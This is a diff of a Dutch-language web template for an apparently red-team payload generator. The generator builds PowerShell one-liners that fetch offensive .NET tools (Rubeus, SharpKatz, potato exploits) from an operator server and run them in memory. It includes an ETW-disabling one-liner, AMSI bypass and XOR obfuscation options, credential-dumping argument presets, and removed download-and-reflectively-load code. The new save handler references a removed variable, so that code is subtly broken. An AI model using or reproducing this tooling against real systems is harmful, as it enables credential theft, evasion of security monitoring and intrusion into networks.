@@ -41,19 +41,12 @@
         <input type="text" id="inp-url" class="input" placeholder="http://10.0.0.1/tools/Rubeus.exe" />
       </div>
 
-      <div class="field" id="field-port">
-        <label for="sel-port">Poort (HTTP server)</label>
-        <select id="sel-port" class="input">
-          <option value="80" selected>80</option>
-          <option value="443">443</option>
-          <option value="8080">8080</option>
-          <option value="custom">Aangepast...</option>
-        </select>
-      </div>
-
-      <div class="field d-none" id="field-port-custom">
-        <label for="inp-port">Aangepaste poort</label>
-        <input type="number" id="inp-port" class="input" placeholder="8443" min="1" max="65535" />
+      <div class="field">
+        <label>Basis URL</label>
+        <div class="ia-url-row">
+          <div class="ia-settings-url" id="ia-base-url-display">laden...</div>
+          <button type="button" id="btn-edit-baseurl" class="btn">Wijzigen</button>
+        </div>
       </div>
 
       <div class="field">
@@ -107,6 +100,7 @@
 
     <div class="gen-actions">
       <button type="button" id="btn-generate" class="btn btn-primary">Genereer &amp; Download PS1</button>
+      <button type="button" id="btn-save-payload" class="btn">Opslaan naar schijf</button>
       <button type="button" id="btn-copy-cmd" class="btn">Kopieer aanroep</button>
       <span id="gen-status" class="status"></span>
     </div>
@@ -187,6 +181,27 @@
     <div id="tools-list"><p class="text-muted">Laden...</p></div>
   </div>
 </section>
+
+<!-- Basis URL modal -->
+<div id="baseurl-modal" class="modal-overlay d-none">
+  <div class="modal-box modal-md">
+    <div class="modal-head">
+      <h3>Basis URL aanpassen</h3>
+      <button class="modal-close-btn" id="btn-baseurl-close">&times;</button>
+    </div>
+    <div class="modal-body">
+      <label class="form-label" for="inp-baseurl-modal">URL <span class="help">(protocol + host + optionele poort)</span></label>
+      <input type="text" id="inp-baseurl-modal" class="form-control" placeholder="https://10.0.0.1:8443" />
+      <p class="help mt-8">Voorbeelden: <code>http://10.0.0.1</code> &nbsp; <code>https://10.0.0.1:443</code> &nbsp; <code>http://10.0.0.1:8080</code></p>
+      <p class="help">Deze waarde wordt ook opgeslagen als globale <em>localhost</em>-instelling.</p>
+    </div>
+    <div class="modal-foot d-flex gap-8 justify-end">
+      <span id="baseurl-modal-status" class="status"></span>
+      <button class="btn" id="btn-baseurl-cancel" type="button">Annuleren</button>
+      <button class="btn btn-primary" id="btn-baseurl-save" type="button">Opslaan</button>
+    </div>
+  </div>
+</div>
 {% endblock %}
 
 {% block scripts %}
@@ -196,11 +211,9 @@
 
   var selSource    = document.getElementById('sel-source');
   var selTool      = document.getElementById('sel-tool');
-  var selPort      = document.getElementById('sel-port');
   var inpUrl       = document.getElementById('inp-url');
   var inpArgs      = document.getElementById('inp-args');
   var inpEntry     = document.getElementById('inp-entry');
-  var inpPort      = document.getElementById('inp-port');
   var inpXorKey    = document.getElementById('inp-xor-key');
   var chkNoAmsi    = document.getElementById('chk-no-amsi');
   var chkNoEtw     = document.getElementById('chk-no-etw');
@@ -208,51 +221,83 @@
   var chkXor       = document.getElementById('chk-xor');
   var chkObfuscate = document.getElementById('chk-obfuscate');
   var btnRegenKey  = document.getElementById('btn-regen-key');
-  var btnGen       = document.getElementById('btn-generate');
-  var btnCopyCmd   = document.getElementById('btn-copy-cmd');
+  var btnGen         = document.getElementById('btn-generate');
+  var btnSavePayload = document.getElementById('btn-save-payload');
+  var btnCopyCmd     = document.getElementById('btn-copy-cmd');
   var genStatus    = document.getElementById('gen-status');
   var previewSec   = document.getElementById('preview-section');
   var filelessSec  = document.getElementById('fileless-section');
   var toolsList    = document.getElementById('tools-list');
 
-  var lhost = '';
+  var baseUrl = 'http://127.0.0.1';  // wordt overschreven door /api/settings
 
   var TOOL_ARGS = {
-    'Rubeus.exe':        'kerberoast',
-    'SharpHound.exe':    '--CollectionMethods All --ZipFileName loot.zip',
-    'Certify.exe':       'find /vulnerable',
-    'Seatbelt.exe':      '-group=all',
-    'SharpUp.exe':       'audit',
-    'Whisker.exe':       'list',
-    'SharpDPAPI.exe':    'triage',
-    'SharpChrome.exe':   'cookies',
-    'Snaffler.exe':      '-s -o snaffler.log',
-    'SharpWMI.exe':      'action=query query="SELECT * FROM Win32_ComputerSystem"',
-    'PingCastle.exe':    '--healthcheck',
-    'GodPotato.exe':     '-cmd "cmd /c whoami"',
-    'PrintSpoofer64.exe':'-i -c powershell',
-    'SweetPotato.exe':   '-p cmd.exe -a "/c whoami"',
-    'StandIn.exe':       '--object samaccountname=*',
-    'SharpGPOAbuse.exe': '--AddComputerTask --TaskName Upd --Author DOMAIN\\Administrator --Command cmd.exe --Arguments "/c whoami"',
-    'SharpSQL.exe':      '',
-    'SharpKatz.exe':     '--Command sekurlsa::logonpasswords',
-    'Inveigh.exe':       '',
-    'SafetyKatz.exe':    '',
-    'ADRecon.exe':       '',
-    'SharpRDP.exe':      '',
+    // Kerberos / AD
+    'Rubeus.exe':              'kerberoast',
+    'SharpHound.exe':          '--CollectionMethods All --ZipFileName loot.zip',
+    'Certify.exe':             'find /vulnerable',
+    'Whisker.exe':             'list',
+    'StandIn.exe':             '--object samaccountname=*',
+    'GoldenGMSA.exe':         'query --sid S-1-5-21-...',
+    // Enum / recon
+    'Seatbelt.exe':            '-group=all',
+    'SharpUp.exe':             'audit',
+    'SharpWMI.exe':            'action=query query="SELECT * FROM Win32_ComputerSystem"',
+    'PingCastle.exe':          '--healthcheck',
+    'ADRecon.exe':             '',
+    'Snaffler.exe':            '-s -o snaffler.log',
+    'SharpSQL.exe':            '',
+    'Inveigh.exe':             '',
+    // Credentials
+    'SafetyKatz.exe':          'logonpasswords',
+    'BetterSafetyKatz.exe':    'sekurlsa::logonpasswords exit',
+    'SharpKatz.exe':           '--Command sekurlsa::logonpasswords',
+    'SharpDPAPI.exe':          'triage',
+    'SharpChrome.exe':         'cookies',
+    // Lateral / RDP
+    'SharpRDP.exe':            '--computername TARGET --command "cmd /c whoami"',
+    'SharpGPOAbuse.exe':       '--AddComputerTask --TaskName Upd --Author DOMAIN\\Administrator --Command cmd.exe --Arguments "/c whoami"',
+    // Privesc
+    'GodPotato.exe':           '-cmd "cmd /c whoami"',
+    'PrintSpoofer64.exe':      '-i -c powershell',
+    'SweetPotato.exe':         '-p cmd.exe -a "/c whoami"',
   };
 
   var ETW_ONELINER = '$p=[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\')' +
     '.GetField(\'etwProvider\',\'NonPublic,Static\').GetValue($null);' +
     '[Void]$p.GetType().GetField(\'m_enabled\',\'NonPublic,Instance\').SetValue($p,[Byte]0)';
 
-  function buildXorFileless(dlUrl, keyHex) {
-    return '$k=[byte[]]([regex]::Matches(\'' + keyHex + '\',..)' +
-      '|%{[Convert]::ToInt32($_.Value,16)});' +
-      '$r=(New-Object Net.WebClient).DownloadData(\'' + dlUrl + '\');' +
-      '$b=New-Object byte[] $r.Length;' +
-      'for($i=0;$i -lt $r.Length;$i++){$b[$i]=$r[$i] -bxor $k[$i%$k.Length]};' +
-      '[Reflection.Assembly]::Load($b)';
+  // buildXorFileless is vervangen door server-side /api/invoke-assembly/fileless
+
+  // Bouw -Arg parameter string met correcte PowerShell quoting.
+  // Args die beginnen met '-' of een spatie bevatten worden geciteerd,
+  // zodat PS ze niet als switch-parameter beschouwt.
+  function buildArgStr(raw) {
+    if (!raw) return '';
+    var tokens = raw.trim().split(/\s+/);
+    var quoted = tokens.map(function(t) {
+      return (t.charAt(0) === '-' || t.indexOf(' ') >= 0)
+        ? '"' + t.replace(/"/g, '`"') + '"'
+        : t;
+    });
+    return ' -Arg ' + quoted.join(',');
+  }
+
+  var _filelessTimer = null;
+  function scheduleFileless(params) {
+    if (_filelessTimer) clearTimeout(_filelessTimer);
+    _filelessTimer = setTimeout(function() {
+      fetch('/api/invoke-assembly/fileless?' + params)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          setText('cmd-fileless',      data.full);
+          setText('cmd-fileless-bare', data.bare);
+        })
+        .catch(function() {
+          setText('cmd-fileless',      '(fout bij genereren)');
+          setText('cmd-fileless-bare', '(fout bij genereren)');
+        });
+    }, 350);
   }
 
   function randomHex(n) {
@@ -299,15 +344,20 @@
   bindCopy('copy-fileless',      'cmd-fileless');
   bindCopy('copy-fileless-bare', 'cmd-fileless-bare');
 
-  function getPort() {
-    if (selPort.value === 'custom') {
-      var p = parseInt(inpPort.value, 10);
-      return (p > 0 && p < 65536) ? String(p) : '80';
-    }
-    return selPort.value;
+  function getBaseUrl() {
+    return baseUrl.replace(/\/$/, '');
   }
 
-  function getBaseUrl() { return 'http://' + lhost + ':' + getPort(); }
+  function getPort() {
+    // Extraheer poortnummer uit baseUrl voor API-calls die enkel een port verwachten
+    try {
+      var u = new URL(baseUrl);
+      if (u.port) return u.port;
+      return u.protocol === 'https:' ? '443' : '80';
+    } catch(e) {
+      return '80';
+    }
+  }
 
   function getXorKey() {
     return chkXor.checked ? inpXorKey.value.trim().toLowerCase() : '';
@@ -319,7 +369,12 @@
     var base = getBaseUrl();
     if (src === 'url')  return inpUrl.value.trim();
     if (!tool)          return '';
-    if (src === 'smb')  return '\\\\' + lhost + '\\share\\tools\\' + tool;
+    if (src === 'smb') {
+      // SMB: gebruik alleen het hostname-gedeelte zonder protocol
+      var smbHost;
+      try { smbHost = new URL(baseUrl).hostname; } catch(e) { smbHost = baseUrl; }
+      return '\\\\' + smbHost + '\\share\\tools\\' + tool;
+    }
     var folder = (src === 'payloads') ? 'payloads' : 'tools';
     if (xorKey) return base + '/api/invoke-assembly/xor/' + folder + '/' + tool + '?key=' + xorKey;
     return base + '/' + folder + '/' + tool;
@@ -336,7 +391,9 @@
     xhr.onload = function() {
       if (xhr.status === 200) {
         var d = JSON.parse(xhr.responseText);
-        lhost = (d.localhost || '').replace(/^https?:\/\//, '');
+        baseUrl = (d.localhost || 'http://127.0.0.1').replace(/\/$/, '');
+        var disp = document.getElementById('ia-base-url-display');
+        if (disp) disp.textContent = baseUrl;
         loadTools();
       }
     };
@@ -418,15 +475,8 @@
     var isSmb = (src === 'smb');
     document.getElementById('field-tool').classList.toggle('d-none', isUrl);
     document.getElementById('field-url').classList.toggle('d-none', !isUrl);
-    document.getElementById('field-port').classList.toggle('d-none', isSmb);
-    document.getElementById('field-port-custom').classList.toggle('d-none', isSmb || selPort.value !== 'custom');
     if (src === 'tools' || src === 'smb') loadTools();
     else if (src === 'payloads')          loadPayloads();
-    updatePreview();
-  });
-
-  selPort.addEventListener('change', function() {
-    document.getElementById('field-port-custom').classList.toggle('d-none', selPort.value !== 'custom');
     updatePreview();
   });
 
@@ -453,7 +503,6 @@
   inpXorKey.addEventListener('input',    updatePreview);
   inpArgs.addEventListener('input',      updatePreview);
   inpUrl.addEventListener('input',       updatePreview);
-  inpPort.addEventListener('input',      updatePreview);
   inpEntry.addEventListener('input',     updatePreview);
   chkNoAmsi.addEventListener('change',   updatePreview);
   chkNoEtw.addEventListener('change',    updatePreview);
@@ -466,7 +515,7 @@
     if (!target) { hideEl(previewSec); hideEl(filelessSec); return; }
 
     var args       = inpArgs.value.trim();
-    var argStr     = args       ? ' -Arg ' + args              : '';
+    var argStr     = buildArgStr(args);
     var src        = selSource.value;
     var tool       = getToolName();
     var noAmsi     = chkNoAmsi.checked;
@@ -503,8 +552,10 @@
 
     var invokeCmd;
     if (src === 'url' || src === 'smb') {
+      var smbHost;
+      try { smbHost = new URL(baseUrl).hostname; } catch(e) { smbHost = baseUrl; }
       var rawTarget = (src === 'smb')
-        ? '\\\\' + lhost + '\\share\\tools\\' + tool
+        ? '\\\\' + smbHost + '\\share\\tools\\' + tool
         : inpUrl.value.trim();
       invokeCmd = '.\\invoke_assembly.ps1 -Url ' + rawTarget + argStr + epStr + xorStr + noAmsiStr + noEtwStr + noSleepStr;
     } else if (src === 'tools') {
@@ -523,32 +574,18 @@
     parts.push(invokeCmd);
     setText('cmd-oneliner', parts.join('; '));
 
-    var filelessLoad;
-    if (xorKey) {
-      filelessLoad = buildXorFileless(target, xorKey) + '.EntryPoint';
-    } else {
-      filelessLoad = '[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData(\'' + target + '\')).EntryPoint';
-    }
-    var bareInvoke;
-    if (args) {
-      var argArr = '@(' + args.trim().split(/\s+/).map(function(a){
-        return '\'' + a.replace(/'/g, "''") + '\'';
-      }).join(',') + ')';
-      bareInvoke = filelessLoad + '.Invoke($null,@(,[string[]]' + argArr + '))';
-    } else {
-      bareInvoke = filelessLoad + '.Invoke($null,$null)';
-    }
-
-    var filelessParts = [];
-    if (!noAmsi) filelessParts.push('IEX(New-Object Net.WebClient).downloadString(\'' + amsiUrl + '\')');
-    if (!noEtw)  filelessParts.push(ETW_ONELINER);
-    filelessParts.push(bareInvoke);
-
-    setText('cmd-fileless',      filelessParts.join('; '));
-    setText('cmd-fileless-bare', bareInvoke);
-
     showEl(previewSec);
     showEl(filelessSec);
+
+    // Fileless one-liner: server-side obfuscated generatie (gedebounced)
+    var flParams = new URLSearchParams({ url: target });
+    if (xorKey) flParams.set('key',     xorKey);
+    if (args)   flParams.set('args',    args);
+    if (noAmsi) flParams.set('no_amsi', '1');
+    if (noEtw)  flParams.set('no_etw',  '1');
+    setText('cmd-fileless',      '...');
+    setText('cmd-fileless-bare', '...');
+    scheduleFileless(flParams);
   }
 
   btnGen.addEventListener('click', function() {
@@ -587,12 +624,105 @@
     setTimeout(function(){ genStatus.textContent = ''; }, 1500);
   });
 
+  btnSavePayload.addEventListener('click', function() {
+    var src    = selSource.value;
+    var tool   = (src === 'tools' || src === 'smb') ? selTool.value : '';
+    var pload  = (src === 'payloads') ? selTool.value : '';
+    var urlVal = (src === 'url' || src === 'smb')
+      ? (src === 'smb' ? '\\\\' + lhost + '\\share\\tools\\' + selTool.value : inpUrl.value.trim())
+      : '';
+    var xorKey = chkXor.checked ? inpXorKey.value.trim().toLowerCase() : '';
+    var csrf   = (document.getElementById('finding-csrf') || {}).value || '';
+
+    btnSavePayload.disabled = true;
+    var origText = btnSavePayload.textContent;
+
+    fetch('/api/invoke-assembly/save-payload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+      body: JSON.stringify({
+        tool:       tool,
+        payload:    pload,
+        url:        urlVal,
+        args:       inpArgs.value.trim(),
+        port:       getPort(),
+        entrypoint: inpEntry.value.trim(),
+        xor:        xorKey,
+        obfuscate:  chkObfuscate.checked,
+      }),
+    })
+    .then(function(r) { return r.json().then(function(d) { return { ok: r.ok, d: d }; }); })
+    .then(function(res) {
+      if (!res.ok) throw new Error(res.d.error || 'HTTP fout');
+      btnSavePayload.textContent = 'Opgeslagen!';
+      setTimeout(function() {
+        btnSavePayload.textContent = origText;
+        btnSavePayload.disabled = false;
+      }, 2500);
+    })
+    .catch(function(e) {
+      genStatus.textContent = 'Fout bij opslaan: ' + e.message;
+      genStatus.className = 'status fail';
+      btnSavePayload.disabled = false;
+      setTimeout(function() { genStatus.textContent = ''; genStatus.className = 'status'; }, 4000);
+    });
+  });
+
   btnCopyCmd.addEventListener('click', function() {
     var el = document.getElementById('cmd-invoke');
     if (el && el.textContent) copyText(el.textContent, btnCopyCmd);
   });
 
   loadSettings();
+
+  // ── Basis URL modal ──────────────────────────────
+  var baseurlModal  = document.getElementById('baseurl-modal');
+  var inpBaseurlModal = document.getElementById('inp-baseurl-modal');
+  var baseurlStatus = document.getElementById('baseurl-modal-status');
+
+  document.getElementById('btn-edit-baseurl').addEventListener('click', function() {
+    inpBaseurlModal.value = baseUrl;
+    baseurlStatus.textContent = '';
+    baseurlModal.classList.remove('d-none');
+    inpBaseurlModal.focus();
+    inpBaseurlModal.select();
+  });
+
+  function closeBaseurlModal() { baseurlModal.classList.add('d-none'); }
+  document.getElementById('btn-baseurl-close').addEventListener('click', closeBaseurlModal);
+  document.getElementById('btn-baseurl-cancel').addEventListener('click', closeBaseurlModal);
+  baseurlModal.addEventListener('click', function(e) { if (e.target === baseurlModal) closeBaseurlModal(); });
+
+  document.getElementById('btn-baseurl-save').addEventListener('click', function() {
+    var val = inpBaseurlModal.value.trim();
+    if (!val) { baseurlStatus.textContent = 'Vul een URL in'; return; }
+    if (!/^https?:\/\/.+/.test(val)) { baseurlStatus.textContent = 'URL moet beginnen met http:// of https://'; return; }
+    val = val.replace(/\/$/, '');
+    var csrf = (document.getElementById('finding-csrf') || {}).value || '';
+    fetch('/api/settings', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+      body: JSON.stringify({ localhost: val }),
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      if (d.ok) {
+        baseUrl = val;
+        var disp = document.getElementById('ia-base-url-display');
+        if (disp) disp.textContent = baseUrl;
+        updatePreview();
+        closeBaseurlModal();
+      } else {
+        baseurlStatus.textContent = 'Fout bij opslaan';
+      }
+    })
+    .catch(function() { baseurlStatus.textContent = 'Netwerkfout'; });
+  });
+
+  inpBaseurlModal.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') document.getElementById('btn-baseurl-save').click();
+    if (e.key === 'Escape') closeBaseurlModal();
+  });
 })();
 </script>
 {% endblock %}
